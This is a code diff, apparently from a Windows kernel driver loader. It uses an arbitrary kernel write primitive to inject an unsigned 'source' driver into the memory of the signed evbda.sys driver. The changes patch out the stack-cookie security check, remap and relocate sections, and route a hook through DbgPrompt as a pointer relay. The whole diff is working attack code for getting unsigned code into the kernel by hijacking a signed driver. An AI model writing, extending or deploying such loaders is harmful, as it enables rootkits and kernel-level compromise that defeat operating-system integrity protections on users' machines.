@@ -499,6 +499,8 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 		}
 		LDRLog(L"source driver mapped at 0x%p\n", mapped_source);
 
+		// Patch __security_check_cookie CALL in Mark_GS_Function export
+		PE_PatchExportFuncSecondCall((ULONG_PTR)mapped_source, source_sys_path, "Mark_GS_Function");
 		// Source code bytes: from mapped image at base_of_code
 		UCHAR* source_code = (UCHAR*)mapped_source + source_base_of_code;
 
@@ -552,130 +554,173 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 			}
 
 			// Write source driver non-code sections into evbda.sys kernel space
-				{
-					PIMAGE_NT_HEADERS nt = RtlImageNtHeader((PVOID)mapped_source);
-					if (nt) {
-						DWORD num_sections = nt->FileHeader.NumberOfSections;
-						PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
-						for (DWORD i = 0; i < num_sections; i++, sec++) {
-							// Skip code section (already written) and reloc section
-							if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
+			// Phase 1: Collect writable section remap info, then fix all references at once
+			{
+				PESectionRemap remaps[16];
+				DWORD remap_count = 0;
+				PIMAGE_NT_HEADERS nt = RtlImageNtHeader((PVOID)mapped_source);
+				if (nt) {
+					DWORD num_sections = nt->FileHeader.NumberOfSections;
+					PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+					for (DWORD i = 0; i < num_sections; i++, sec++) {
+						if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
 								continue;
-							if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
+						if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
+							continue;
+						DWORD sec_rva = sec->VirtualAddress;
+						DWORD sec_vsize = sec->Misc.VirtualSize;
+						if (sec_rva == 0 || sec_vsize == 0)
+							continue;
+						// Also skip IAT range (already written above)
+						if (nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IAT) {
+							DWORD iat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
+							DWORD iat_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+							if (sec_rva == iat_rva && sec_vsize == iat_size)
 								continue;
-							DWORD sec_rva = sec->VirtualAddress;
-							DWORD sec_vsize = sec->Misc.VirtualSize;
-							if (sec_rva == 0 || sec_vsize == 0)
-								continue;
-							// Also skip IAT range (already written above)
-							if (nt->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IAT) {
-								DWORD iat_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
-								DWORD iat_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
-								if (sec_rva == iat_rva && sec_vsize == iat_size)
+						}
+
+						if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) {
+							// Writable section (.data etc): find evbda writable section target
+							for (DWORD j = 0; j < evbda_section_count; j++) {
+								if (!(evbda_sections[j].characteristics & IMAGE_SCN_MEM_WRITE))
 									continue;
-							}
-
-							if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) {
-								// Writable section (.data etc): write into evbda's writable section
-								// Find evbda's first writable section with enough space
-								DWORD64 data_actual_addr = 0;
-								BOOL found_writable = FALSE;
-								for (DWORD j = 0; j < evbda_section_count; j++) {
-									if (!(evbda_sections[j].characteristics & IMAGE_SCN_MEM_WRITE))
-										continue;
-									if (evbda_sections[j].virtual_size >= sec_vsize) {
-										data_actual_addr = (DWORD64)evbda_base + evbda_sections[j].rva;
-										LDRLog(L"source [%S] -> evbda writable section [%S] at 0x%llX (rva=0x%x, vsize=0x%x)\n",
-											(CHAR*)sec->Name, evbda_sections[j].name, data_actual_addr,
-											evbda_sections[j].rva, evbda_sections[j].virtual_size);
-										found_writable = TRUE;
-										break;
+								if (evbda_sections[j].virtual_size >= sec_vsize) {
+									DWORD64 data_actual_addr = (DWORD64)evbda_base + evbda_sections[j].rva;
+									LDRLog(L"source [%S] -> evbda writable section [%S] at 0x%llX (rva=0x%x, vsize=0x%x)\n",
+										(CHAR*)sec->Name, evbda_sections[j].name, data_actual_addr,
+										evbda_sections[j].rva, evbda_sections[j].virtual_size);
+									if (remap_count < 16) {
+										remaps[remap_count].old_addr = target_kernel_addr + sec_rva;
+										remaps[remap_count].old_size = sec_vsize;
+										remaps[remap_count].new_addr = data_actual_addr;
+										remap_count++;
 									}
-								}
-								if (!found_writable) {
-									LDRLog(L"abort: evbda.sys has no writable section large enough for [%S] (0x%x bytes)\n",
-										(CHAR*)sec->Name, sec_vsize);
-									free(mapped_source);
-									return FALSE;
-								}
-
-								PVOID sec_data = (PVOID)((ULONG_PTR)mapped_source + sec_rva);
-								if (!g_kpTable->WritePrimitive((PVOID)data_actual_addr, sec_data, sec_vsize)) {
-									LDRLog(L"failed to write source driver section [%S] into evbda writable section at 0x%llX\n",
-										(CHAR*)sec->Name, data_actual_addr);
-								} else {
-									LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda writable section at 0x%llX\n",
-										(CHAR*)sec->Name, sec_vsize, data_actual_addr);
-								}
-
-								// Fix code references: relocations in code currently point to
-								// target_kernel_addr + sec_rva (the .text-based address).
-								// Adjust them to point to data_actual_addr instead.
-								DWORD64 old_data_addr = target_kernel_addr + sec_rva;
-								PE_FixRemappedSectionRefs((ULONG_PTR)mapped_source, target_kernel_addr,
-										source_base_of_code, source_pe.size_of_code,
-										old_data_addr, sec_vsize, data_actual_addr);
-							} else {
-								// Read-only section (.rdata, .pdata, etc): write at target_kernel_addr + sec_rva
-								DWORD target_offset_in_evbda = evbda_base_of_code + sec_rva;
-								BOOL found_section = FALSE;
-								for (DWORD j = 0; j < evbda_section_count; j++) {
-									DWORD sec_end = evbda_sections[j].rva + evbda_sections[j].virtual_size;
-									if (target_offset_in_evbda >= evbda_sections[j].rva &&
-										target_offset_in_evbda + sec_vsize <= sec_end) {
-										found_section = TRUE;
-										break;
-									}
-								}
-								if (!found_section) {
-									LDRLog(L"abort: evbda.sys has no section covering offset 0x%x (source section [%S] at rva=0x%x, vsize=0x%x)\n",
-										target_offset_in_evbda, (CHAR*)sec->Name, sec_rva, sec_vsize);
-									free(mapped_source);
-									return FALSE;
-								}
-
-								PVOID sec_data = (PVOID)((ULONG_PTR)mapped_source + sec_rva);
-								PVOID krnl_sec_addr = (PVOID)(target_kernel_addr + sec_rva);
-								if (!g_kpTable->WritePrimitive(krnl_sec_addr, sec_data, sec_vsize)) {
-									LDRLog(L"failed to write source driver section [%S] into evbda.sys at 0x%p\n", (CHAR*)sec->Name, krnl_sec_addr);
-								} else {
-									LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda.sys at 0x%p\n", (CHAR*)sec->Name, sec_vsize, krnl_sec_addr);
+									break;
 								}
 							}
 						}
 					}
 				}
 
-				// Rewrite source driver code and read-only sections to kernel
-				// (relocations may have changed due to writable section remapping above)
-				if (!g_kpTable->WritePrimitive(krnl_write_addr, source_code, source_pe.size_of_code)) {
-					LDRLog(L"failed to rewrite source driver code after section remap\n");
-					free(mapped_source);
-					return FALSE;
+				// Fix all references (DIR64 + RIP-relative) that point into remapped writable sections
+				if (remap_count > 0) {
+					for (DWORD ri = 0; ri < remap_count; ri++) {
+						LDRLog(L"  remap[%u]: [0x%llX, 0x%llX) -> 0x%llX\n",
+							ri, remaps[ri].old_addr, remaps[ri].old_addr + remaps[ri].old_size, remaps[ri].new_addr);
+					}
+					PE_FixRemappedSectionRefs((ULONG_PTR)mapped_source, target_kernel_addr,
+						source_base_of_code, source_pe.size_of_code,
+						remaps, remap_count);
 				}
-				LDRLog(L"rewrote source driver code (0x%x bytes) after section remap\n", source_pe.size_of_code);
-				// Also rewrite read-only sections that may contain remapped addresses
-				{
-					PIMAGE_NT_HEADERS nt2 = RtlImageNtHeader((PVOID)mapped_source);
-					if (nt2) {
-						DWORD ns = nt2->FileHeader.NumberOfSections;
-						PIMAGE_SECTION_HEADER sec2 = IMAGE_FIRST_SECTION(nt2);
-						for (DWORD i = 0; i < ns; i++, sec2++) {
-							if (sec2->Characteristics & IMAGE_SCN_CNT_CODE)
+			}
+
+			// Phase 2: Write all non-code sections into kernel (after fixup)
+			{
+				PIMAGE_NT_HEADERS nt3 = RtlImageNtHeader((PVOID)mapped_source);
+				if (nt3) {
+					DWORD num_sections = nt3->FileHeader.NumberOfSections;
+					PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt3);
+					for (DWORD i = 0; i < num_sections; i++, sec++) {
+						if (sec->Characteristics & IMAGE_SCN_CNT_CODE)
+							continue;
+						if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
+							continue;
+						DWORD sec_rva = sec->VirtualAddress;
+						DWORD sec_vsize = sec->Misc.VirtualSize;
+						if (sec_rva == 0 || sec_vsize == 0)
+							continue;
+						if (nt3->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_IAT) {
+							DWORD iat_rva = nt3->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress;
+							DWORD iat_size = nt3->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;
+							if (sec_rva == iat_rva && sec_vsize == iat_size)
 								continue;
-							if (sec2->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
-								continue;
-							if (sec2->Characteristics & IMAGE_SCN_MEM_WRITE)
-								continue;
-							DWORD sr = sec2->VirtualAddress;
-							DWORD sv = sec2->Misc.VirtualSize;
-							if (sr == 0 || sv == 0) continue;
-							PVOID sd = (PVOID)((ULONG_PTR)mapped_source + sr);
+						}
+
+						PVOID sec_data = (PVOID)((ULONG_PTR)mapped_source + sec_rva);
+						if (sec->Characteristics & IMAGE_SCN_MEM_WRITE) {
+							// Writable section: write into evbda writable section
+							for (DWORD j = 0; j < evbda_section_count; j++) {
+								if (!(evbda_sections[j].characteristics & IMAGE_SCN_MEM_WRITE))
+									continue;
+								if (evbda_sections[j].virtual_size >= sec_vsize) {
+									PVOID ka = (PVOID)((DWORD64)evbda_base + evbda_sections[j].rva);
+									g_kpTable->WritePrimitive(ka, sec_data, sec_vsize);
+									LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda writable section at 0x%p\n",
+										(CHAR*)sec->Name, sec_vsize, ka);
+									break;
+								}
+							}
+						} else {
+							// Read-only section: write at target_kernel_addr + sec_rva
+							DWORD target_offset_in_evbda = evbda_base_of_code + sec_rva;
+							BOOL found_section = FALSE;
+							for (DWORD j = 0; j < evbda_section_count; j++) {
+								DWORD sec_end = evbda_sections[j].rva + evbda_sections[j].virtual_size;
+								if (target_offset_in_evbda >= evbda_sections[j].rva &&
+									target_offset_in_evbda + sec_vsize <= sec_end) {
+									found_section = TRUE;
+									break;
+								}
+							}
+							if (!found_section) {
+								LDRLog(L"abort: evbda.sys has no section covering offset 0x%x (source section [%S] at rva=0x%x, vsize=0x%x)\n",
+									target_offset_in_evbda, (CHAR*)sec->Name, sec_rva, sec_vsize);
+								free(mapped_source);
+								return FALSE;
+							}
+							PVOID krnl_sec_addr = (PVOID)(target_kernel_addr + sec_rva);
+							if (!g_kpTable->WritePrimitive(krnl_sec_addr, sec_data, sec_vsize)) {
+								LDRLog(L"failed to write source driver section [%S] into evbda.sys at 0x%p\n", (CHAR*)sec->Name, krnl_sec_addr);
+							} else {
+								LDRLog(L"wrote source driver section [%S] (0x%x bytes) into evbda.sys at 0x%p\n", (CHAR*)sec->Name, sec_vsize, krnl_sec_addr);
+							}
+						}
+					}
+				}
+			}
+
+			// Rewrite source driver code to kernel (RIP-relative displacements may have changed)
+			if (!g_kpTable->WritePrimitive(krnl_write_addr, source_code, source_pe.size_of_code)) {
+				LDRLog(L"failed to rewrite source driver code after section remap\n");
+				free(mapped_source);
+				return FALSE;
+			}
+			LDRLog(L"rewrote source driver code (0x%x bytes) after section remap\n", source_pe.size_of_code);
+			// Also rewrite read-only and writable sections after fixup
+			// Writable sections may have DIR64 pointers fixed by PE_FixRemappedSectionRefs
+			{
+				PIMAGE_NT_HEADERS nt2 = RtlImageNtHeader((PVOID)mapped_source);
+				if (nt2) {
+					DWORD ns = nt2->FileHeader.NumberOfSections;
+					PIMAGE_SECTION_HEADER sec2 = IMAGE_FIRST_SECTION(nt2);
+					for (DWORD i = 0; i < ns; i++, sec2++) {
+						if (sec2->Characteristics & IMAGE_SCN_CNT_CODE)
+							continue;
+						if (sec2->Characteristics & IMAGE_SCN_MEM_DISCARDABLE)
+							continue;
+						DWORD sr = sec2->VirtualAddress;
+						DWORD sv = sec2->Misc.VirtualSize;
+						if (sr == 0 || sv == 0) continue;
+						PVOID sd = (PVOID)((ULONG_PTR)mapped_source + sr);
+						if (sec2->Characteristics & IMAGE_SCN_MEM_WRITE) {
+							for (DWORD j = 0; j < evbda_section_count; j++) {
+								if (!(evbda_sections[j].characteristics & IMAGE_SCN_MEM_WRITE))
+									continue;
+								if (evbda_sections[j].virtual_size >= sv) {
+									PVOID ka = (PVOID)((DWORD64)evbda_base + evbda_sections[j].rva);
+									g_kpTable->WritePrimitive(ka, sd, sv);
+									LDRLog(L"rewrote writable section [%S] (0x%x bytes) at 0x%p after fixup\n",
+										(CHAR*)sec2->Name, sv, ka);
+									break;
+								}
+							}
+						} else {
 							PVOID ka = (PVOID)(target_kernel_addr + sr);
 							g_kpTable->WritePrimitive(ka, sd, sv);
 						}
 					}
 				}
+			}
 
 // Scan source driver entry point for the 2nd CALL instruction target (hook_code_addr)
 		{
@@ -718,26 +763,13 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	DWORD64 trampoline_addr = (DWORD64)tramp_base + stage_1_func_offset + stage_0_xoreaxeaxret_size + stage_0_placeholder_size;
 	LDRLog(L"trampoline_addr=0x%llX\n", trampoline_addr);
 
-	// Distance check: can ff25 rel32 reach the PIT from hook_point?
-	DWORD64 next_rip = (DWORD64)hook_point + ff25jmpsize;
-	DWORD64 distance = (next_rip > trampoline_addr) ? (next_rip - trampoline_addr) : (trampoline_addr - next_rip);
-	LDRLog(L"distance=0x%llX (hook_point=0x%p, next_rip=0x%llX, trampoline_addr=0x%llX)\n",
-		distance, hook_point, next_rip, trampoline_addr);
-
 	DWORD64 trampoline_pit = 0;
-	if (distance > 0xFFFFFFFF) {
-		LDRLog(L"distance exceeds 4GB, using DbgPrompt as PIT relay\n");
-		if (!LdrCtx_GetDbgPromptAbsAddr()) {
-			LDRLog(L"DbgPrompt not resolved, cannot install hook\n");
-			return FALSE;
-		}
-		trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
-		LDRLog(L"write trampoline_addr to DbgPrompt PIT at 0x%llX\n", trampoline_pit);
+	if (!LdrCtx_GetDbgPromptAbsAddr()) {
+		LDRLog(L"DbgPrompt not resolved, cannot install hook\n");
+		return FALSE;
 	}
-	else {
-		trampoline_pit = (DWORD64)tramp_base + stage_2_func_offset + TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC;
-		LDRLog(L"write trampoline_addr to PIT at 0x%llX\n", trampoline_pit);
-	}
+	trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
+	LDRLog(L"write trampoline_addr to DbgPrompt at 0x%llX\n", trampoline_pit);
 
 	// Write trampoline_addr to PIT
 	if (!g_kpTable->WritePrimitive((PVOID)trampoline_pit, (void*)(&trampoline_addr), sizeof(DWORD64))) {
